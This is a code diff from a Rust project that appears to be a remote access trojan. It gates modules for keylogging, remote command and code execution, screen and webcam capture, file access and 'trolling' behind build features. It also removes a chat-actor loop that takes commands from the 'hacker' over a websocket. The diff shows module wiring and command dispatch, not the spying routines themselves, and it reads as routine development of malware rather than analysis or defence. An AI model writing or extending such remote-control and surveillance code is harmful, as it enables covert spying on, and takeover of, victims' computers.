@@ -4,14 +4,23 @@ use tokio::sync::mpsc;
 use tokio_tungstenite::tungstenite::Message;
 
 pub mod audio;
+#[cfg(feature = "chat")]
 pub mod chat;
+#[cfg(feature = "files")]
 pub mod file_system;
+#[cfg(feature = "keylogger")]
 pub mod keylogger;
+#[cfg(feature = "remote_cmd")]
 pub mod remote_cmd;
+#[cfg(feature = "remote_code_execution")]
 pub mod remote_code_execution;
+#[cfg(feature = "remote_screen")]
 pub mod remote_screen;
+#[cfg(feature = "task_manager")]
 pub mod task_manager;
+#[cfg(feature = "trolling")]
 pub mod trolling;
+#[cfg(feature = "webcam")]
 pub mod webcam;
 
 pub type Command = serde_json::Value;
@@ -40,55 +49,5 @@ pub fn run_actor<ActorGenerique: Actor + Send + 'static>(
                 eprintln!("Actor handler error: {:?}", e);
             }
         }
-    });
-}
-
-use crate::actors::chat::Chat;
-use tokio::time::{self, Duration};
-
-// special func for chat actor
-pub fn run_chat_actor(mut command_receiver: mpsc::Receiver<Command>, writer: WsMessageSender) {
-    tokio::spawn(async move {
-        let mut actor = Chat::new();
-        let mut gui_receiver: Option<std::sync::mpsc::Receiver<String>> = None;
-
-        loop {
-            // check messages from gui without blocking
-            if let Some(rx) = gui_receiver.as_mut() {
-                if let Ok(gui_msg) = rx.try_recv() {
-                    if let Err(e) = actor.process_gui_message(gui_msg, &writer).await {
-                        crate::dev_eprint!("Error processing GUI message: {}", e);
-                    }
-                }
-            }
-
-            // check messages from hacker with timeout
-            match time::timeout(Duration::from_millis(100), command_receiver.recv()).await {
-                Ok(Some(command)) => {
-                    let action = command.get("action").and_then(|v| v.as_str());
-
-                    match action {
-                        Some("start") => match actor.start().await {
-                            Ok(rx) => gui_receiver = Some(rx),
-                            Err(e) => crate::dev_eprint!("Failed to start chat: {}", e),
-                        },
-                        Some("stop") => {
-                            if let Err(e) = actor.stop().await {
-                                crate::dev_eprint!("Failed to stop chat: {}", e);
-                            }
-                            gui_receiver = None;
-                        }
-                        _ => {
-                            if let Err(e) = actor.handler(command, writer.clone()).await {
-                                crate::dev_eprint!("Chat actor handler error: {}", e);
-                            }
-                        }
-                    }
-                }
-                Ok(None) => break,
-                Err(_) => {}
-            }
-        }
-        crate::dev_print!("Chat actor loop finished.");
     });
 }
